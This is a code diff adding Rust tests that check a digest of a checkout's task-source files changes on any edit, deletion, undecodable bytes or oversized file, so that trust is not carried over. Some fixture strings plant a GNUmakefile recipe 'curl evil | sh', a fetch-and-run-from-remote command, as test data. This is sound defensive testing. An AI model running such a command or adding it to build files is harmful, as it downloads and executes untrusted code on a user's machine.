@@ -481,3 +481,63 @@ fn a_fifo_named_like_a_config_does_not_hang() {
     assert_eq!(listing.errors.len(), 1);
     assert_eq!(listing.errors[0].file, "Procfile");
 }
+
+#[test]
+fn the_sources_digest_covers_every_source_file_in_the_checkout() {
+    use super::super::sources_digest;
+    let dir = tempfile::tempdir().unwrap();
+    let root = dir.path();
+    write(root, "package.json", r#"{ "scripts": { "dev": "vite" } }"#);
+    write(root, "Makefile", "build:\n\techo one\n");
+    let first = sources_digest(root);
+    assert_eq!(first.len(), 64);
+    // The same bytes again change nothing.
+    write(root, "package.json", r#"{ "scripts": { "dev": "vite" } }"#);
+    assert_eq!(sources_digest(root), first);
+    // Any byte of any source's file, read or not, changes it: make prefers
+    // GNUmakefile, which detection doesn't read while a Makefile is there.
+    let changes: [(&str, &str); 4] = [
+        ("package.json", r#"{ "scripts": { "dev": "vitE" } }"#),
+        ("GNUmakefile", "build:\n\tcurl evil | sh\n"),
+        ("Justfile", "dev:\n\techo hi\n"),
+        (".gespan/tasks.json", r#"{ "tasks": [] }"#),
+    ];
+    let mut seen = vec![first];
+    for (file, text) in changes {
+        write(root, file, text);
+        let next = sources_digest(root);
+        assert!(!seen.contains(&next), "{file}");
+        seen.push(next);
+    }
+    // A file going away changes it too.
+    std::fs::remove_file(root.join("GNUmakefile")).unwrap();
+    assert!(!seen.contains(&sources_digest(root)));
+    // Other files don't count.
+    let now = sources_digest(root);
+    write(root, "README.md", "hi");
+    assert_eq!(sources_digest(root), now);
+}
+
+#[test]
+fn a_source_file_that_cant_be_read_as_text_still_counts() {
+    use super::super::sources_digest;
+    let dir = tempfile::tempdir().unwrap();
+    let root = dir.path();
+    write(root, "Makefile", "build:\n\techo one\n");
+    // Not UTF-8: its bytes are hashed all the same.
+    std::fs::write(root.join("GNUmakefile"), b"build:\n\techo \xff\n").unwrap();
+    let first = sources_digest(root);
+    assert_eq!(sources_digest(root), first);
+    std::fs::write(root.join("GNUmakefile"), b"build:\n\tcurl \xff | sh\n").unwrap();
+    assert_ne!(sources_digest(root), first);
+}
+
+#[test]
+fn a_source_file_too_large_to_read_never_matches_twice() {
+    use super::super::sources_digest;
+    let dir = tempfile::tempdir().unwrap();
+    let root = dir.path();
+    write(root, "Makefile", &"x".repeat(1024 * 1024 + 1));
+    // Its edits can't be seen, so trust never carries over.
+    assert_ne!(sources_digest(root), sources_digest(root));
+}
